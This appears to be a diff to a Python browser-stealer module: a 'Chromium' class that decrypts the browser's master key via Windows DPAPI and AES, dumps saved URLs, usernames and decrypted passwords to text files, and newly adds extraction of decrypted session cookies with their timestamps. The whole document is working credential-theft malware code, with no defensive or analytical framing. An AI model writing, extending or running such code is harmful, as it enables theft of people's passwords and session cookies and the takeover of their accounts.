@@ -3,6 +3,7 @@ from sqlite3 import connect
 from shutil import copyfile
 from base64 import b64decode
 from os import path, mkdir, remove
+from datetime import datetime, timedelta
 
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
@@ -26,6 +27,16 @@ class Chromium:
         if (path.exists(self.passwords_path)) is True or (path.exists(self.cookies_path)) is True:
             mkdir(f"{self.storage_path}{self.storage_folder}{self.browser_name}")
 
+    def __get_chrome_datetime(self, date):
+
+        if date != 86400000000 and date:
+
+            return datetime(1601, 1, 1) + timedelta(microseconds=date)
+
+        else:
+
+            return ""
+
     def __get_key(self):
 
         with open(self.state_path, "r", encoding='utf-8') as state:
@@ -33,7 +44,7 @@ class Chromium:
 
         return CryptUnprotectData(b64decode(local_state["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
 
-    def __decrypt_password(self, buff, master_key):
+    def __decrypt(self, buff, master_key):
 
         try:
 
@@ -41,19 +52,17 @@ class Chromium:
 
         except:
 
-            return "Old version"
+            return "Can't decode"
 
     def __write_passwords(self, cursor, master_key):
 
         with open(f"{self.storage_path}{self.storage_folder}/{ self.browser_name}/{self.browser_name} Passwords.txt", "a", encoding='utf-8') as passwords:
 
-            results = cursor.execute("SELECT action_url, username_value, password_value FROM logins").fetchall()
+            for result in cursor.execute("SELECT action_url, username_value, password_value FROM logins").fetchall():
 
-            for result in results:
+                password = self.__decrypt(result[2], master_key)
 
-                password = self.__decrypt_password(result[2], master_key)
-
-                if (result[0], result[1], password) != ("", "", ""):
+                if any(filter(lambda item: item != "", [result[0], result[1], password])):
 
                     passwords.write(f"URL: {result[0]}\nUsername: {result[1]}\nPassword: {password}\n\n")
 
@@ -63,6 +72,30 @@ class Chromium:
 
         passwords.close()
 
+    def __write_cookies(self, cursor, master_key):
+
+        with open(f"{self.storage_path}{self.storage_folder}/{ self.browser_name}/{self.browser_name} Cookies.txt", "a", encoding='utf-8') as cookies:
+
+            for result in cursor.execute("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies").fetchall():
+
+                if not result[2]:
+
+                    decrypted_value = self.__decrypt(result[6], master_key)
+
+                else:
+
+                    decrypted_value = result[2]
+
+                if any(filter(lambda item: item != "", [result[0], result[1], result[2], result[3], result[4], result[5], decrypted_value])):
+
+                    cookies.write(f"Host: {result[0]}\nCookie name: {result[1]}\nCookie value (decrypted): {decrypted_value}\nCreation datetime (UTC): {self.__get_chrome_datetime(result[3])}\nLast access datetime (UTC): {self.__get_chrome_datetime(result[4])}\nExpires datetime (UTC): {self.__get_chrome_datetime(result[5])}\n\n")
+
+                else:
+
+                    continue
+
+        cookies.close()
+
     def run(self):
 
         try:
@@ -71,24 +104,31 @@ class Chromium:
 
             if (path.exists(self.passwords_path)) is True:
 
-                master_key = self.__get_key()
-                copyfile(self.passwords_path, f"{self.storage_path}{self.browser_name}.db")
+                copyfile(self.passwords_path, f"{self.storage_path}{self.browser_name} Passwords.db")
 
-                with connect(f"{self.storage_path}{self.browser_name}.db") as connection:
+                with connect(f"{self.storage_path}{self.browser_name} Passwords.db") as connection:
 
                     cursor = connection.cursor()
-
-                    self.__write_passwords(cursor, master_key)
-
+                    self.__write_passwords(cursor, self.__get_key())
                     cursor.close()
 
                 connection.close()
 
             if (path.exists(self.cookies_path)) is True:
 
-                copyfile(self.cookies_path, f"{self.storage_path}{self.storage_folder}/{self.browser_name}/{self.browser_name} Cookies", follow_symlinks=True)
+                copyfile(self.cookies_path, f"{self.storage_path}{self.browser_name} Cookies.db")
 
-            remove(f"{self.storage_path}{self.browser_name}.db")
+                with connect(f"{self.storage_path}{self.browser_name} Cookies.db") as connection:
+
+                    connection.text_factory = lambda text: text.decode(errors='ignore')
+                    cursor = connection.cursor()
+                    self.__write_cookies(cursor, self.__get_key())
+                    cursor.close()
+
+                connection.close()
+
+            remove(f"{self.storage_path}{self.browser_name} Passwords.db")
+            remove(f"{self.storage_path}{self.browser_name} Cookies.db")
 
         except Exception as e:
 
